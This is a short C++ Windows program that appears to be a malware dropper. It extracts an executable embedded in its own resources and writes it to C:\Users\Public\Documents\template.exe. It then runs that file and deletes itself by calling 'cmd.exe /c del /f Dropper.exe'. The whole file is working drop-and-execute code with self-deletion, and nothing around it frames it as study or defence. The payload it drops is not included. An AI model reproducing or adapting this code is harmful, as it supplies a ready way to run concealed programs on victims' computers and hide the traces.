#include <iostream>
#include "resource.h"
#include <Windows.h>
using namespace std;

LPVOID LoadFileInResource(int name, int type, DWORD& size)
{
	HMODULE handle = GetModuleHandle(NULL);
	HRSRC rc = FindResource(handle, MAKEINTRESOURCE(name), MAKEINTRESOURCE(type));
	if (!rc)
	{
		return 0;
	}
	HGLOBAL rcData = LoadResource(handle, rc);
	if (!rcData)
		return 0;
	size = SizeofResource(handle, rc);
	return LockResource(rcData);
}
int main()
{
	DWORD size = 0;
	LPVOID data;
	DWORD numByteWriten= 0;
	data = LoadFileInResource(IDR_EXECUTABLE, EXECUTABLE, size);
	HANDLE file = CreateFile(L"C:\\Users\\Public\\Documents\\template.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (file == INVALID_HANDLE_VALUE)
	{
		return 0;
	}
	if (!WriteFile(file, data, size, &numByteWriten, NULL))
		return 0;
	CloseHandle(file);
	//
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	LPCWSTR cmtPath = L"C:\\Users\\Public\\Documents\\template.exe";
	//LPWSTR cmtArg = const_cast<LPWSTR>(TEXT("C:\\Windows\\System32\\cmd.exe \c C:\\Users\\Public\\Documents\\template.exe"));
	if (CreateProcess(cmtPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
	{
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	else
	{
		cout << GetLastError() << endl;
		return 1;
	}
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	cmtPath = L"C:\\Windows\\System32\\cmd.exe";
	LPWSTR cmtArg1 = const_cast<LPWSTR>(TEXT("C:\\Windows\\System32\\cmd.exe /c del /f Dropper.exe"));
	if (CreateProcess(cmtPath, cmtArg1, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
	{
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	return 0;
}